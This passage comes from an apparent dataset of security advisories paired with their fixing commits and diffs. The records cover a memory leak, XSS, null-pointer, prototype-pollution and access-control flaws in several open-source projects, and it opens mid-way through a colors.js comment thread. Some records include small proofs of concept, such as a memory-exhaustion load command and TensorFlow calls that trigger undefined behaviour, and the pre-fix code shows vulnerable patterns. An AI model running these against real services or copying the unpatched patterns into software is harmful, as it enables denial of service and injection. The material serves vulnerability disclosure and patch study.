\u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u043e\u0439, \u0435\u0441\u043b\u0438 \u0435\u043c\u0443 \u0447\u0442\u043e-\u0442\u043e \u043d\u0435 \u043d\u0440\u0430\u0432\u0438\u0442\u0441\u044f, \u0438 \u0447\u0442\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u0441\u043e\u0433\u043b\u0430\u0448\u0430\u0435\u0442\u0441\u044f \u043d\u0435 \u0432\u0438\u043d\u0438\u0442\u044c \u0430\u0432\u0442\u043e\u0440\u0430 \u043d\u0438 \u0432 \u0447\u0435\u043c, \u0435\u0441\u043b\u0438 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 \u043d\u0430\u043d\u0435\u0441\u043b\u0430 \u0435\u043c\u0443 \u043a\u0430\u043a\u043e\u0439-\u0442\u043e \u0432\u0440\u0435\u0434. \u0410\u0432\u0442\u043e\u0440 \u0436\u0435 \u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u0437\u0430 \u0441\u043e\u0431\u043e\u0439 \u043f\u0440\u0430\u0432\u043e \u0434\u0435\u043b\u0430\u0442\u044c \u0441\u043e \u0441\u0432\u043e\u0435\u0439 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u043e\u0439 \u0432\u0441\u0435, \u0447\u0442\u043e \u0435\u0433\u043e \u0434\u0443\u0448\u0435 \u0432\u0437\u0434\u0443\u043c\u0430\u0435\u0442\u0441\u044f. \\r\\n\\r\\n\u0418\u0442\u0430\u043a, \u0433\u043e\u0441\u043f\u043e\u0434\u0438\u043d, \u0447\u0442\u043e \u0436\u0435 \u044f \u0432\u044b\u0434\u0435\u0440\u043d\u0443\u043b \u0442\u0443\u0442 \u0438\u0437 \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0430? \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0438\u0437\u0432\u043e\u043b\u044c \u043d\u0430 \u043c\u0435\u043d\u044f \u0442\u0443\u0442 \u043d\u0435 \u043d\u0430\u0433\u043e\u0432\u0430\u0440\u0438\u0432\u0430\u0442\u044c \u0438 \u0433\u043e\u043b\u043e\u0441\u043b\u043e\u0432\u043d\u044b\u043c\u0438 \u043e\u0431\u0432\u0438\u043d\u0435\u043d\u0438\u044f\u043c\u0438 \u043d\u0435 \u0431\u0440\u043e\u0441\u0430\u0442\u044c\u0441\u044f. \u042f \u043d\u0438\u0447\u0435\u0433\u043e \u0438 \u043d\u0438\u043a\u043e\u0433\u0434\u0430 \u0438\u0437 \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0430 \u043d\u0435 \u0432\u044b\u0434\u0435\u0440\u0433\u0438\u0432\u0430\u044e, \u0430 \u0435\u0441\u043b\u0438 \u0443 \u0442\u0435\u0431\u044f \u043d\u0435\u0442 \u0434\u043e\u0432\u043e\u0434\u043e\u0432 \u043f\u0440\u043e\u0442\u0438\u0432 \u0441\u0432\u043e\u0435\u0439 \u043d\u0435\u043f\u0440\u0430\u0432\u043e\u0442\u044b, \u0442\u043e \u043d\u0435 \u043d\u0430\u0434\u043e \u0432\u0435\u0448\u0430\u0442\u044c \u044d\u0442\u043e \u043d\u0430 \u043c\u0435\u043d\u044f. \u042d\u0442\u0438\u043a\u0443 \u0432\u043e\u043f\u0440\u043e\u0441\u0430 \u0432 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0438, \u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u044f \u043e\u0442\u0432\u0435\u0447\u0430\u043b, \u0442\u044b \u043d\u0435 \u043f\u043e\u0434\u043d\u0438\u043c\u0430\u043b.\\r\\n\\r\\n\u0412\u043e-\u0432\u0442\u043e\u0440\u044b\u0445, \u0442\u043e, \u0447\u0442\u043e \u0442\u0430\u043c \u0447\u0430\u0441\u0442\u044c \u0444\u0440\u0430\u0437\u044b \u043f\u0440\u0435\u0434\u043d\u0430\u0437\u043d\u0430\u0447\u0430\u043b\u0430\u0441\u044c \u0434\u0440\u0443\u0433\u043e\u043c\u0443 \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0443 - \u0442\u0443\u0442, \u043d\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u044e, \u043f\u0443\u0431\u043b\u0438\u0447\u043d\u0430\u044f \u0434\u0438\u0441\u043a\u0443\u0441\u0441\u0438\u044f. \u0415\u0441\u043b\u0438 \u0442\u0435\u0431\u0435 \u0442\u0430\u043a \u0441\u0442\u0440\u0430\u0448\u043d\u043e, \u0447\u0442\u043e \u043d\u0430 \u0442\u0432\u043e\u0439 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439 \u043d\u0435 \u0434\u0430\u0439 \u0411\u043e\u0433 \u043e\u0442\u0432\u0435\u0442\u0438\u0442 \u043a\u0442\u043e-\u0442\u043e \u0435\u0449\u0435, \u0442\u043e \u043d\u0435 \u043d\u0430\u0434\u043e \u043f\u0438\u0441\u0430\u0442\u044c \u0435\u0433\u043e \u0442\u0443\u0442: \u043e\u0442\u043e\u0448\u043b\u0438 \u0441\u043e\u0431\u0435\u0441\u0435\u0434\u043d\u0438\u043a\u0443 e-mail \u0438 \u0435\u0433\u043e \u043d\u0438\u043a\u043e\u0433\u0434\u0430 \u043d\u0438\u043a\u0442\u043e, \u043a\u0440\u043e\u043c\u0435 \u0442\u0432\u043e\u0435\u0433\u043e \u0441\u043e\u0431\u0435\u0441\u0435\u0434\u043d\u0438\u043a\u0430, \u043d\u0435 \u0443\u0432\u0438\u0434\u0438\u0442. \u0410 \u043f\u043e\u043a\u0430 \u043f\u0438\u0448\u0435\u0448\u044c \u0447\u0442\u043e-\u0442\u043e \u043d\u0430 \u043f\u0443\u0431\u043b\u0438\u043a\u0443, \u043d\u0435 \u0443\u0434\u0438\u0432\u043b\u044f\u0439\u0441\u044f, \u0435\u0441\u043b\u0438 \u043a\u0442\u043e-\u0442\u043e \u0438\u0437 \u043f\u0443\u0431\u043b\u0438\u043a\u0438 \u0447\u0442\u043e-\u0442\u043e \u0432 \u0438\u0442\u043e\u0433\u0435 \u043e\u0442\u0432\u0435\u0447\u0430\u0435\u0442 \u0442\u0435\u0431\u0435.'}, 'com_81': {'author': 'teror4uks', 'datetime': '01\/27\/2022, 13:26:19', 'body': '@wtlgo \u0442\u0432\u043e\u0451 \u043f\u0440\u0430\u0432\u043e \u043d\u0430\u043f\u0438\u0441\u0430\u0442\u044c, \u043c\u043e\u0451 \u043f\u0440\u0430\u0432\u043e \u043f\u0440\u043e\u0438\u0433\u043d\u043e\u0440\u0438\u0442\u044c \u0442\u043e\u0442 \u0431\u0440\u0435\u0434 \u0447\u0442\u043e \u0442\u044b \u043f\u0438\u0448\u0435\u0448\u044c'}, 'com_82': {'author': 'wtlgo', 'datetime': '01\/27\/2022, 13:28:13', 'body': '@teror4uks \u044d\u0442\u043e \u043d\u0435 \u0431\u0440\u0435\u0434. \u0411\u0440\u0435\u0434 \u043d\u0430\u043f\u0438\u0441\u0430\u043b \u0442\u0430\u043a\u0438 \u0442\u044b, \u0447\u0442\u043e \u044f \u0438 \u043f\u044b\u0442\u0430\u044e\u0441\u044c \u0442\u0435\u0431\u0435 \u0434\u043e\u043d\u0435\u0441\u0442\u0438.'}, 'com_83': {'author': 'elegantShock2258', 'datetime': '01\/28\/2022, 16:20:54', 'body': 'Speak American! Liberty babyyy \ud83c\uddfa\ud83c\uddf8\ud83c\uddfa\ud83c\uddf8\ud83c\uddfa\ud83c\uddf8'}, 'com_84': {'author': 'elegantShock2258', 'datetime': '01\/28\/2022, 16:24:07', 'body': '> I just paid @Marak 100$. If you have a time to have a futile dispute, use that time to help people in need.\\r\\n\\r\\nYes he needs proper help instead of showing his outbursts up here in the internet and ruining his good name and reputation.'}, 'com_85': {'author': 'Awilum', 'datetime': '02\/01\/2022, 12:20:19', 'body': '> https:\/\/opensea.io\/marak\\r\\n> \\r\\n> Are you sure he needs help?\\r\\n@okyanusoz \\r\\n\\r\\nbecause this story about Colors.js and Faker.js is is look like a scam. imho.'}, 'com_86': {'author': 'satouriko', 'datetime': '02\/04\/2022, 03:20:05', 'body': '> @hello-smile6 what does \"syeal your data\" mean?\\r\\n\\r\\nI guess \"steal\"'}, 'com_87': {'author': 'hello-smile6', 'datetime': '02\/08\/2022, 01:24:33', 'body': '> > @hello-smile6 what does \"syeal your data\" mean?\\r\\n> \\r\\n> I guess \"steal\"\\r\\n\\r\\nYes. Unfortunately, as I said, I didn\\'t create it, so don\\'t blame me for spelling.'}, 'com_88': {'author': 'Lin2Jing4', 'datetime': '02\/12\/2022, 16:39:10', 'body': '\"You can feel the regret. With Cuck Licenses, you get the worst of two worlds: You get no credit for your work, nor money for licensing fees like other proprietary software and your software will be used to violate your and other users\\' privacy when it is used in closed-source environments. Oh, no... copes incoming\"\\r\\n(Luke Madison Smith, 2021, \"Why I Use the GPL and Not Cuck Licenses\").'}, 'com_89': {'author': 'elegantShock2258', 'datetime': '03\/02\/2022, 15:45:11', 'body': \"> there is no american language\\r\\n\\r\\nYes that's the joke\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'package.json': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Marak\/colors.js\/raw\/6bc50e79eeaa1d87369bb3e7e608ebed18c5cf26\/package.json', 'patch': '@@ -1,7 +1,7 @@\\n {\\n     \"name\": \"colors\",\\n     \"description\": \"get colors in your node.js console\",\\n-    \"version\": \"1.4.44-liberty\",\\n+    \"version\": \"1.4.44-liberty-2\",\\n     \"author\": \"Marak Squires\",\\n     \"contributors\": [\\n         {'}}","message_norm":"bump to `v1.4.44-liberty-2`","language":"en","entities":"[('v1.4.44', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['package.json'])","num_files":1.0},{"index":696,"vuln_id":"GHSA-5rwj-j5m3-3chj","cwe_id":"{'CWE-401'}","score":7.5,"chain":"{'https:\/\/github.com\/sonicdoe\/detect-character-encoding\/commit\/d44356927b92e3b13e178071bf6d7c671766f588'}","dataset":"osv","summary":"Missing Release of Memory after Effective Lifetime in detect-character-encoding ### Impact\n\nIn detect-character-encoding v0.3.0 and earlier, allocated memory is not released.\n\n### Patches\n\nThe problem has been patched in [detect-character-encoding v0.3.1](https:\/\/github.com\/sonicdoe\/detect-character-encoding\/releases\/tag\/v0.3.1).\n\n### CVSS score\n\n[CVSS:3.1\/AV:N\/AC:L\/PR:N\/UI:N\/S:U\/C:N\/I:N\/A:H\/RL:O\/RC:C](https:\/\/www.first.org\/cvss\/calculator\/3.1#CVSS:3.1\/AV:N\/AC:L\/PR:N\/UI:N\/S:U\/C:N\/I:N\/A:H\/RL:O\/RC:C)\n\nBase Score: 7.5 (High)\nTemporal Score: 7.2 (High)\n\nSince detect-character-encoding is a library, the scoring is based on the \u201c[reasonable worst-case implementation scenario](https:\/\/www.first.org\/cvss\/v3.1\/user-guide#3-7-Scoring-Vulnerabilities-in-Software-Libraries-and-Similar)\u201d, namely, using detect-character-encoding in a program accessible over the internet which becomes unavailable when running out of memory. Depending on your specific implementation, the vulnerability\u2019s severity in your program may be different.\n\n### Proof of concept\n\n```js\nconst express = require(\"express\");\nconst detectCharacterEncoding = require(\"detect-character-encoding\");\n\nconst app = express();\n\napp.get(\"\/\", (req, res) => {\n  detectCharacterEncoding(Buffer.from(\"foo\"));\n\n  res.end();\n});\n\napp.listen(3000);\n```\n\n`hey -n 1000000 http:\/\/localhost:3000` ([`hey`](https:\/\/github.com\/rakyll\/hey)) causes the Node.js process to consume more and more memory.\n\n### References\n\n- https:\/\/github.com\/sonicdoe\/detect-character-encoding\/commit\/d44356927b92e3b13e178071bf6d7c671766f588\n- https:\/\/github.com\/sonicdoe\/detect-character-encoding\/pull\/6","published_date":"2021-09-01","chain_len":1,"project":"https:\/\/github.com\/sonicdoe\/detect-character-encoding","commit_href":"https:\/\/github.com\/sonicdoe\/detect-character-encoding\/commit\/d44356927b92e3b13e178071bf6d7c671766f588","commit_sha":"d44356927b92e3b13e178071bf6d7c671766f588","patch":"SINGLE","chain_ord":"['d44356927b92e3b13e178071bf6d7c671766f588']","before_first_fix_commit":"{'2e3aa333a573960edf2d782bca3b25a01e49678b'}","last_fix_commit":"d44356927b92e3b13e178071bf6d7c671766f588","chain_ord_pos":1.0,"commit_datetime":"03\/09\/2017, 18:19:58","message":"Fix memory leak by properly closing `charsetDetector`","author":"Michael Hertsch","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'icuWrapper.cpp': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sonicdoe\/detect-character-encoding\/raw\/d44356927b92e3b13e178071bf6d7c671766f588\/icuWrapper.cpp', 'patch': '@@ -28,27 +28,31 @@ NAN_METHOD(DetectCharacterEncoding) {\\n \\n \\tif(U_FAILURE(errorCode)) {\\n \\t\\tNan::ThrowError(\"Failed to set ICU charset detector\u2019s text.\");\\n+\\t\\tucsdet_close(charsetDetector);\\n \\t\\treturn;\\n \\t}\\n \\n \\tcharsetMatch = ucsdet_detect(charsetDetector, &errorCode);\\n \\n \\tif(U_FAILURE(errorCode)) {\\n \\t\\tNan::ThrowError(\"Failed to detect charset.\");\\n+\\t\\tucsdet_close(charsetDetector);\\n \\t\\treturn;\\n \\t}\\n \\n \\tconst char *charsetName = ucsdet_getName(charsetMatch, &errorCode);\\n \\n \\tif(U_FAILURE(errorCode)) {\\n \\t\\tNan::ThrowError(\"Failed to get name from charset match.\");\\n+\\t\\tucsdet_close(charsetDetector);\\n \\t\\treturn;\\n \\t}\\n \\n \\tint32_t confidence = ucsdet_getConfidence(charsetMatch, &errorCode);\\n \\n \\tif(U_FAILURE(errorCode)) {\\n \\t\\tNan::ThrowError(\"Failed to get confidence from charset match.\");\\n+\\t\\tucsdet_close(charsetDetector);\\n \\t\\treturn;\\n \\t}\\n \\n@@ -57,6 +61,7 @@ NAN_METHOD(DetectCharacterEncoding) {\\n \\tobj->Set(Nan::New<v8::String>(\"confidence\").ToLocalChecked(), Nan::New<v8::Number>(confidence));\\n \\n \\tinfo.GetReturnValue().Set(obj);\\n+\\tucsdet_close(charsetDetector);\\n }\\n \\n void Init(v8::Local<v8::Object> exports) {'}}","message_norm":"fix memory leak by properly closing `charsetdetector`","language":"en","entities":"[('fix', 'ACTION', ''), ('memory leak', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['icuWrapper.cpp'])","num_files":1.0},{"index":707,"vuln_id":"GHSA-5vr6-hm68-5j9p","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/librenms\/librenms\/pull\/13554\/commits\/4f231a0f49b6c953d506913364ffd7fb3a660630'}","dataset":"osv","summary":"Cross-site Scripting in LibreNMS LibreNMS 21.11.0 is affected by is affected by a Cross Site Scripting (XSS) vulnerability in includes\/html\/forms\/poller-groups.inc.php.","published_date":"2021-12-03","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/pull\/13554\/commits\/4f231a0f49b6c953d506913364ffd7fb3a660630","commit_sha":"4f231a0f49b6c953d506913364ffd7fb3a660630","patch":"SINGLE","chain_ord":"['4f231a0f49b6c953d506913364ffd7fb3a660630']","before_first_fix_commit":"{'fff7b45a7599f8f13a55250dc5f2b957f3394194'}","last_fix_commit":"4f231a0f49b6c953d506913364ffd7fb3a660630","chain_ord_pos":1.0,"commit_datetime":"11\/22\/2021, 22:31:45","message":"fix XSS vulnerability in poller-groups.inc.php","author":"AL-KASSAR","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'includes\/html\/forms\/poller-groups.inc.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/4f231a0f49b6c953d506913364ffd7fb3a660630\/includes%2Fhtml%2Fforms%2Fpoller-groups.inc.php', 'patch': '@@ -44,5 +44,5 @@\\n if (! empty($ok)) {\\n     exit(\"$ok\");\\n } else {\\n-    exit(\"ERROR: $error\");\\n+    exit(\"ERROR: \".htmlspecialchars($error));;\\n }'}}","message_norm":"fix xss vulnerability in poller-groups.inc.php","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['includes\/html\/forms\/poller-groups.inc.php'])","num_files":1.0},{"index":713,"vuln_id":"GHSA-5wpj-c6f7-24x8","cwe_id":"{'CWE-475', 'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a5b89cd68c02329d793356bda85d079e9e69b4e7', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dbdd98c37bc25249e8f288bd30d01e118a7b4498'}","dataset":"osv","summary":"Undefined behavior when users supply invalid resource handles ### Impact\nMultiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QueueIsClosedV2(handle=[])\n```\n\n```python\nimport tensorflow as tf\n\ntf.summary.flush(writer=())\n```\n  \nIn graph mode, it would have been impossible to perform these API calls, but migration to TF 2.x eager mode opened up this vulnerability. If the resource handle is empty, then a reference is bound to a null pointer inside TensorFlow codebase (various codepaths). This is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [a5b89cd68c02329d793356bda85d079e9e69b4e7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a5b89cd68c02329d793356bda85d079e9e69b4e7) and GitHub commit [dbdd98c37bc25249e8f288bd30d01e118a7b4498](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dbdd98c37bc25249e8f288bd30d01e118a7b4498).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Hong Jin from Singapore Management University.","published_date":"2022-05-24","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a5b89cd68c02329d793356bda85d079e9e69b4e7","commit_sha":"a5b89cd68c02329d793356bda85d079e9e69b4e7","patch":"MULTI","chain_ord":"['dbdd98c37bc25249e8f288bd30d01e118a7b4498', 'a5b89cd68c02329d793356bda85d079e9e69b4e7']","before_first_fix_commit":"{'c2ce4c72fdc9658e23dd9d42cb9ed30bdd60c2a6'}","last_fix_commit":"a5b89cd68c02329d793356bda85d079e9e69b4e7","chain_ord_pos":2.0,"commit_datetime":"04\/30\/2022, 04:07:06","message":"Fix empty resource handle vulnerability.\n\nSome ops that attempt to extract a resource handle from user input\ncan lead to nullptr dereferences.  This returns an error in such\na case.\n\nPiperOrigin-RevId: 445571938","author":"Antonio Sanchez","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/common_runtime\/eager\/execute.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a5b89cd68c02329d793356bda85d079e9e69b4e7\/tensorflow%2Fcore%2Fcommon_runtime%2Feager%2Fexecute.cc', 'patch': '@@ -304,6 +304,9 @@ Status GetDeviceForInput(const EagerOperation& op, const EagerContext& ctx,\\n     const Tensor* tensor;\\n     \/\/ TODO(fishx): Avoid blocking here.\\n     TF_RETURN_IF_ERROR(tensor_handle->Tensor(&tensor));\\n+    if (tensor->NumElements() == 0) {\\n+      return errors::InvalidArgument(\"Empty resource handle\");\\n+    }\\n     const ResourceHandle& handle = tensor->flat<ResourceHandle>()(0);\\n     device_name = handle.device();'}}","message_norm":"fix empty resource handle vulnerability.\n\nsome ops that attempt to extract a resource handle from user input\ncan lead to nullptr dereferences.  this returns an error in such\na case.\n\npiperorigin-revid: 445571938","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('error', 'FLAW', ''), ('445571938', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/common_runtime\/eager\/execute.cc'])","num_files":1.0},{"index":716,"vuln_id":"GHSA-5x33-h32w-6vr2","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/e8632a4ad0b4da3763cbbe5949594aa449b483bb'}","dataset":"osv","summary":"Cross site-scripting (XSS) moodle The filter in the tag manager required extra sanitizing to prevent a reflected XSS risk. This affects 3.9 to 3.9.1, 3.8 to 3.8.4, 3.7 to 3.7.7, 3.5 to 3.5.13 and earlier unsupported versions. Fixed in 3.9.2, 3.8.5, 3.7.8 and 3.5.14.","published_date":"2021-03-29","chain_len":1,"project":"https:\/\/github.com\/moodle\/moodle","commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/e8632a4ad0b4da3763cbbe5949594aa449b483bb","commit_sha":"e8632a4ad0b4da3763cbbe5949594aa449b483bb","patch":"SINGLE","chain_ord":"['e8632a4ad0b4da3763cbbe5949594aa449b483bb']","before_first_fix_commit":"{'630078eb4a189a17378ea6cf19be989da2114c1c'}","last_fix_commit":"e8632a4ad0b4da3763cbbe5949594aa449b483bb","chain_ord_pos":1.0,"commit_datetime":"08\/04\/2020, 10:04:27","message":"MDL-69340 tag: Correct the filter input HTML in the tag manager","author":"Michael Hawkins","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'tag\/manage.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/e8632a4ad0b4da3763cbbe5949594aa449b483bb\/tag%2Fmanage.php', 'patch': '@@ -211,7 +211,7 @@\\n print(\\'<div class=\"tag-management-form generalbox\"><label class=\"accesshide\" for=\"id_tagfilter\">\\'. get_string(\\'search\\') .\\'<\/label>\\'.\\n     \\'<input type=\"hidden\" name=\"tc\" value=\"\\'.$tagcollid.\\'\" \/>\\'.\\n     \\'<input type=\"hidden\" name=\"perpage\" value=\"\\'.$perpage.\\'\" \/>\\'.\\n-    \\'<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=\\' . s($filter) . \\'>\\'.\\n+    \\'<input id=\"id_tagfilter\" name=\"filter\" type=\"text\" value=\"\\' . s($filter) . \\'\">\\'.\\n     \\'<input value=\"\\'. s(get_string(\\'search\\')) .\\'\" type=\"submit\" class=\"btn btn-secondary\"> \\'.\\n     ($filter !== \\'\\' ? html_writer::link(new moodle_url($PAGE->url, array(\\'filter\\' => null)),\\n         get_string(\\'resetfilter\\', \\'tag\\'), array(\\'class\\' => \\'resetfilterlink\\')) : \\'\\').'}}","message_norm":"mdl-69340 tag: correct the filter input html in the tag manager","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tag\/manage.php'])","num_files":1.0},{"index":720,"vuln_id":"GHSA-5xjx-4xcm-hpcm","cwe_id":"{'CWE-1321', 'CWE-915'}","score":7.3,"chain":"{'https:\/\/github.com\/BadOPCode\/NoDash\/commit\/b9cc2b3b49f6cd5228e406bc57e17a28b998fea5'}","dataset":"osv","summary":"Prototype Pollution in ts-nodash `ts-nodash` before version 1.2.7 is vulnerable to Prototype Pollution via the Merge() function due to lack of validation input.","published_date":"2021-12-10","chain_len":1,"project":"https:\/\/github.com\/BadOPCode\/NoDash","commit_href":"https:\/\/github.com\/BadOPCode\/NoDash\/commit\/b9cc2b3b49f6cd5228e406bc57e17a28b998fea5","commit_sha":"b9cc2b3b49f6cd5228e406bc57e17a28b998fea5","patch":"SINGLE","chain_ord":"['b9cc2b3b49f6cd5228e406bc57e17a28b998fea5']","before_first_fix_commit":"{'78f4ffab4ed76c43f6f7fb91d8b329acb0d6e684'}","last_fix_commit":"b9cc2b3b49f6cd5228e406bc57e17a28b998fea5","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2021, 02:50:07","message":"Security fix for Prototype Pollution (#20)\n\nCo-authored-by: Arjun Shibu <arjunshibu1999@gmail.com>\r\nCo-authored-by: Jamie Slome <jamie@418sec.com>\r\nCo-authored-by: Shawn <BadOPCode@users.noreply.github.com>","author":"huntr.dev | the place to protect open source","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'src\/Merge.ts': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/BadOPCode\/NoDash\/raw\/b9cc2b3b49f6cd5228e406bc57e17a28b998fea5\/src%2FMerge.ts', 'patch': '@@ -47,13 +47,18 @@ const  handleDefaultBehavior = (originalObject: any, newObject: any, behavior?:\\n     if (originalTypeName === \"Object\" && newTypeName === \"Object\") { \/\/ built-in behavior\\n         \/\/ tslint:disable:forin\\n         for (const p in newObject) {\\n+            if (isPrototypePolluted(p)) continue\\n             originalObject[p] = processBehavior(originalObject[p], newObject[p], behavior);\\n         }\\n         \/\/ tslint:enable:forin\\n         return originalObject;\\n     }\\n };\\n \\n+const isPrototypePolluted = (key: any) => {\\n+    return [\\'__proto__\\', \\'constructor\\', \\'prototype\\'].includes(key)\\n+}\\n+\\n \/**\\n  * Recursively merge two objects together.\\n  * @param originalObject The base object. Properties here will be overwritten\\n@@ -72,7 +77,7 @@ export const Merge = (originalObject: any, newObject: any, behavior?: IMergeBeha\\n             return definedBehaviorResults;\\n         }\\n     }\\n-\\n+    \\n     return handleDefaultBehavior(originalObject, newObject, behavior);\\n };'}}","message_norm":"security fix for prototype pollution (#20)\n\nco-authored-by: arjun shibu <arjunshibu1999@gmail.com>\r\nco-authored-by: jamie slome <jamie@418sec.com>\r\nco-authored-by: shawn <badopcode@users.noreply.github.com>","language":"en","entities":"[('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', ''), ('#20', 'ISSUE', ''), ('arjunshibu1999@gmail.com', 'EMAIL', ''), ('jamie@418sec.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Merge.ts'])","num_files":1.0},{"index":723,"vuln_id":"GHSA-5xvc-vgmp-jgc3","cwe_id":"{'CWE-284'}","score":9.1,"chain":"{'https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38\/commits\/9e200d974e0cb85d828a6afedb8ab90a37878f28', 'https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38\/commits\/32b21898fb2b53b1a2e36270de6854ad70e9e9bf'}","dataset":"osv","summary":"Improper Access Control in jupyterhub-firstuseauthenticator ### Impact\n\nWhen JupyterHub is used with FirstUseAuthenticator, the vulnerability allows unauthorized access to any user's account if `create_users=True` and the username is known or guessed.\n\n### Patches\n\nUpgrade to jupyterhub-firstuseauthenticator to 1.0, or apply patch https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38.patch\n\n### Workarounds\n\nIf you cannot upgrade, there is no complete workaround, but it can be mitigated.\n\nIf you cannot upgrade yet, you can disable user creation with `c.FirstUseAuthenticator.create_users = False`, which will only allow login with fully normalized usernames for already existing users prior to jupyterhub-firstuserauthenticator 1.0. If any users have never logged in with their normalized username (i.e. lowercase), they will still be vulnerable until you can patch or upgrade.","published_date":"2021-10-28","chain_len":2,"project":"https:\/\/github.com\/jupyterhub\/firstuseauthenticator","commit_href":"https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38\/commits\/9e200d974e0cb85d828a6afedb8ab90a37878f28","commit_sha":"9e200d974e0cb85d828a6afedb8ab90a37878f28","patch":"MULTI","chain_ord":"['32b21898fb2b53b1a2e36270de6854ad70e9e9bf', '9e200d974e0cb85d828a6afedb8ab90a37878f28']","before_first_fix_commit":"{'32b21898fb2b53b1a2e36270de6854ad70e9e9bf'}","last_fix_commit":"9e200d974e0cb85d828a6afedb8ab90a37878f28","chain_ord_pos":2.0,"commit_datetime":"10\/26\/2021, 07:00:03","message":"Use normalize_username instead of .lower\n\nallows for following normalization changes","author":"Min RK","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'firstuseauthenticator\/firstuseauthenticator.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/raw\/9e200d974e0cb85d828a6afedb8ab90a37878f28\/firstuseauthenticator%2Ffirstuseauthenticator.py', 'patch': \"@@ -138,7 +138,7 @@ def validate_username(self, name):\\n \\n     @gen.coroutine\\n     def authenticate(self, handler, data):\\n-        username = data['username'].lower()\\n+        username = self.normalize_username(data['username'])\\n \\n         if not self.create_users:\\n             if not self._user_exists(username):\"}}","message_norm":"use normalize_username instead of .lower\n\nallows for following normalization changes","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['firstuseauthenticator\/firstuseauthenticator.py'])","num_files":1.0},{"index":724,"vuln_id":"GHSA-5xvc-vgmp-jgc3","cwe_id":"{'CWE-284'}","score":9.1,"chain":"{'https:\/\/github.com\/jupyterhub\/firstuseauthenticator\/pull\/38\/commits\/9e200d974e0cb85d828a6afedb8ab90a37878f28', 